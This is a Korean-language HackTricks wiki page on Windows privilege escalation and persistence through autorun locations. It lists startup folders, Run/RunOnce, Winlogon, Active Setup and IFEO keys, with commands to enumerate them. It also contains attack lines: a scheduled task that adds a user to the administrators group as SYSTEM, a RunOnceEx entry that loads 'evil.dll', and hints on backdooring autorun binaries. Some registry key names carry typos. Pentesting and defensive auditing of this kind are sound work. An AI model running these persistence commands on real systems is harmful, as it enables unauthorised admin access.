# Autoruns을 사용한 권한 상승

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **Hacking 트릭을 공유하려면 PR을** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 저장소에 제출**하세요.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

**해킹 경력**에 관심이 있다면, 해킹할 수 없는 것을 해킹하고 싶다면 - **우리는 고용 중입니다!** (_유창한 폴란드어 필수_).

{% embed url="https://www.stmcyber.com/careers" %}

## WMIC

**Wmic**은 **시작 시** 프로그램을 실행하는 데 사용될 수 있습니다. 시작 시 실행되는 이진 파일을 확인하려면 다음을 사용하세요:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## 예약된 작업

**작업**은 **특정 주기**로 실행되도록 예약될 수 있습니다. 다음 명령어를 사용하여 예약된 이진 파일을 확인하세요:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## 폴더

**시작 프로그램 폴더에 위치한 모든 이진 파일은 시작 시 실행**됩니다. 일반적인 시작 프로그램 폴더는 아래에 계속해서 나열된 폴더들이지만, 시작 프로그램 폴더는 레지스트리에서 지정됩니다. [여기를 읽어보세요.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
## 레지스트리

{% hint style="info" %}
[여기에서 참고](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): **Wow6432Node** 레지스트리 항목은 64비트 Windows 버전을 실행 중임을 나타냅니다. 운영 체제는 이 키를 사용하여 64비트 Windows 버전에서 실행되는 32비트 응용 프로그램을 위해 HKEY\_LOCAL\_MACHINE\SOFTWARE의 별도의 보기를 표시합니다.
{% endhint %}

### 실행

**일반적으로 알려진** AutoRun 레지스트리:

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

**Run** 및 **RunOnce**으로 알려진 레지스트리 키는 사용자가 시스템에 로그인할 때마다 프로그램을 자동으로 실행하기 위해 설계되었습니다. 키의 데이터 값으로 할당된 명령 줄은 260자 이하로 제한됩니다.

**서비스 실행** (부팅 중 서비스의 자동 시작을 제어할 수 있음):

* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

* `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
* `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Windows Vista 및 이후 버전에서는 **Run** 및 **RunOnce** 레지스트리 키가 자동으로 생성되지 않습니다. 이러한 키의 항목은 프로그램을 직접 시작하거나 종속성으로 지정할 수 있습니다. 예를 들어, DLL 파일을 로그온 시 로드하기 위해 **RunOnceEx** 레지스트리 키와 "Depend" 키를 함께 사용할 수 있습니다. 다음은 시스템 시작 시 "C:\\temp\\evil.dll"을 실행하는 레지스트리 항목을 추가하여 이를 설명합니다.
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
{% hint style="info" %}
**Exploit 1**: 다음 중 하나의 레지스트리인 **HKLM** 내부에 쓸 수 있다면, 다른 사용자가 로그인할 때 권한을 상승시킬 수 있습니다.
{% endhint %}

{% hint style="info" %}
**Exploit 2**: 다음 중 하나의 레지스트리에 지정된 이진 파일 중 하나를 덮어쓸 수 있다면, 다른 사용자가 로그인할 때 해당 이진 파일에 백도어를 삽입하여 권한을 상승시킬 수 있습니다.
{% endhint %}
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### 시작 경로

* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

**Startup** 폴더에 위치한 바로 가기는 사용자 로그온 또는 시스템 재부팅 중에 서비스나 애플리케이션을 자동으로 실행시킵니다. **Startup** 폴더의 위치는 **Local Machine** 및 **Current User** 범위의 레지스트리에서 정의됩니다. 이는 지정된 **Startup** 위치에 추가된 바로 가기가 로그온 또는 재부팅 프로세스 이후에 연결된 서비스나 프로그램을 자동으로 시작하도록 보장하기 때문에 프로그램을 자동으로 실행하는 간단한 방법입니다.

{% hint style="info" %}
**HKLM** 아래의 \[User] Shell Folder를 덮어쓸 수 있다면, 제어할 수 있는 폴더를 가리키도록 설정하고 백도어를 배치할 수 있으며, 사용자가 시스템에 로그인할 때마다 권한이 상승됩니다.
{% endhint %}
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### Winlogon 키

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

일반적으로, **Userinit** 키는 **userinit.exe**로 설정됩니다. 그러나 이 키가 수정되면 지정된 실행 파일은 사용자 로그인 시 **Winlogon**에 의해 실행됩니다. 마찬가지로, **Shell** 키는 Windows의 기본 쉘인 **explorer.exe**를 가리키도록 되어 있습니다.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
{% hint style="info" %}
레지스트리 값이나 이진 파일을 덮어쓸 수 있다면 권한을 상승시킬 수 있습니다.
{% endhint %}

### 정책 설정

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

**Run** 키를 확인하세요.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### 안전 모드 명령 프롬프트 변경

Windows 레지스트리의 `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot` 아래에는 기본적으로 `cmd.exe`로 설정된 **`AlternateShell`** 값이 있습니다. 이는 시작 시 "명령 프롬프트와 함께 안전 모드"를 선택할 때 (F8 키를 누름으로써), `cmd.exe`가 사용된다는 것을 의미합니다. 그러나 F8을 누르고 수동으로 선택하지 않고도 컴퓨터를 이 모드로 자동으로 시작할 수 있습니다.

"명령 프롬프트와 함께 안전 모드"에서 자동으로 시작하기 위한 부팅 옵션을 만드는 단계:

1. `boot.ini` 파일의 속성을 읽기 전용, 시스템 및 숨김 플래그를 제거하기 위해 다음 명령을 실행합니다: `attrib c:\boot.ini -r -s -h`
2. `boot.ini` 파일을 편집합니다.
3. 다음과 같은 줄을 삽입합니다: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. `boot.ini` 파일 변경 사항을 저장합니다.
5. 원래 파일 속성을 다시 적용합니다: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** **AlternateShell** 레지스트리 키를 변경하면 사용자 정의 명령 셸 설정이 가능하며, 무단 액세스를 위한 잠재적인 가능성이 있습니다.
- **Exploit 2 (PATH 쓰기 권한):** 시스템 **PATH** 변수의 어느 부분이든 쓰기 권한을 가지고 있다면 특히 `C:\Windows\system32` 이전에, 사용자 정의 `cmd.exe`를 실행할 수 있으며, 시스템이 안전 모드로 시작된 경우 백도어가 될 수 있습니다.
- **Exploit 3 (PATH 및 boot.ini 쓰기 권한):** `boot.ini`에 대한 쓰기 액세스는 자동으로 안전 모드를 시작할 수 있게 하여 다음 재부팅 시 무단 액세스를 용이하게 합니다.

현재 **AlternateShell** 설정을 확인하려면 다음 명령을 사용합니다:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### 설치된 구성 요소

Active Setup은 Windows의 기능으로, 데스크톱 환경이 완전히 로드되기 전에 시작됩니다. 이는 특정 명령의 실행을 우선시하며, 사용자 로그온이 진행되기 전에 완료되어야 합니다. 이 프로세스는 Run 또는 RunOnce 레지스트리 섹션과 같은 다른 시작 항목이 트리거되기 전에 발생합니다.

Active Setup은 다음 레지스트리 키를 통해 관리됩니다:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

이러한 키 내에는 특정 구성 요소에 해당하는 여러 하위 키가 존재합니다. 특히 관심을 끌 수 있는 키 값은 다음과 같습니다:

- **IsInstalled:**
- `0`은 구성 요소의 명령이 실행되지 않음을 나타냅니다.
- `1`은 명령이 각 사용자마다 한 번 실행됨을 의미하며, `IsInstalled` 값이 없는 경우 기본 동작입니다.
- **StubPath:** Active Setup에서 실행될 명령을 정의합니다. `notepad`를 실행하는 등 유효한 명령 줄이 될 수 있습니다.

**보안 인사이트:**

- `IsInstalled`가 `"1"`로 설정되어 있는 키를 수정하거나 작성하면, 특정 `StubPath`와 함께 무단 명령 실행이 발생할 수 있으며, 이는 권한 상승을 위한 가능성이 있습니다.
- **`StubPath`** 값에서 참조하는 이진 파일을 변경하면, 충분한 권한이 있는 경우 권한 상승이 가능합니다.

Active Setup 구성 요소의 **`StubPath`** 구성을 검사하려면 다음 명령을 사용할 수 있습니다:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### 브라우저 도우미 개체

### 브라우저 도우미 개체(Browser Helper Objects, BHOs) 개요

브라우저 도우미 개체(Browser Helper Objects, BHOs)는 Microsoft의 인터넷 익스플로러에 추가 기능을 제공하는 DLL 모듈입니다. 이들은 인터넷 익스플로러와 Windows 익스플로러가 시작될 때마다 로드됩니다. 그러나 **NoExplorer** 키를 1로 설정하여 실행을 차단하면 Windows 익스플로러 인스턴스와 함께 로드되지 않도록 할 수 있습니다.

BHOs는 Windows 10에서 Internet Explorer 11을 통해 호환되지만, Windows의 최신 버전에서 기본 브라우저인 Microsoft Edge에서는 지원되지 않습니다.

시스템에 등록된 BHO를 탐색하기 위해 다음 레지스트리 키를 검사할 수 있습니다:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

각 BHO는 레지스트리에서 **CLSID**로 표시되며, 고유한 식별자로 작동합니다. 각 CLSID에 대한 자세한 정보는 `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`에서 찾을 수 있습니다.

레지스트리에서 BHO를 쿼리하기 위해 다음 명령을 사용할 수 있습니다:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### 인터넷 익스플로러 확장 프로그램

* `HKLM\Software\Microsoft\Internet Explorer\Extensions`
* `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

레지스트리에는 각 dll마다 1개의 새로운 레지스트리가 포함되며, 이는 **CLSID**로 표시됩니다. CLSID 정보는 `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`에서 찾을 수 있습니다.

### 폰트 드라이버

* `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
* `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Open Command

* `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
* `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`

### 오픈 명령어

* `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
* `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### 이미지 파일 실행 옵션

The Image File Execution Options (IFEO) is a Windows feature that allows developers to debug and monitor applications. However, it can also be exploited by attackers for privilege escalation.

IFEO works by intercepting the execution of a specified executable and redirecting it to another executable or script. This can be used to launch malicious code with elevated privileges.

To exploit IFEO for privilege escalation, an attacker needs to create a new registry key under `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`. The name of the key should be the name of the target executable.

Within this key, the attacker can create a string value named `Debugger` and set its value to the path of the malicious executable or script. When the target executable is launched, it will be intercepted by the IFEO feature and redirected to the attacker's code.

To prevent this type of privilege escalation, it is recommended to regularly monitor the `Image File Execution Options` registry key for any suspicious entries. Additionally, restricting access to the registry key can help mitigate the risk.

Remember to always follow ethical guidelines and obtain proper authorization before performing any hacking activities.
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

참고로, **winpeas.exe**에서 이미 검색한 모든 사이트에서 autorun을 찾을 수 있습니다. 그러나 더 포괄적인 자동 실행 파일 목록을 원한다면 [systinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)의 [autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)를 사용할 수 있습니다.
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## 추가 정보

**[https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)**에서 등록된 Autorun과 유사한 레지스트리를 찾을 수 있습니다.

## 참고 자료

* [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
* [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
* [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)
* [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

**해킹 경력**에 관심이 있고 해킹할 수 없는 것을 해킹하고 싶다면 - **저희는 고용 중입니다!** (_유창한 폴란드어 필수_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 **제로에서 영웅까지 AWS 해킹 배우기**!</summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** 팔로우하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 **당신의 해킹 기교를 공유하세요**.

</details>
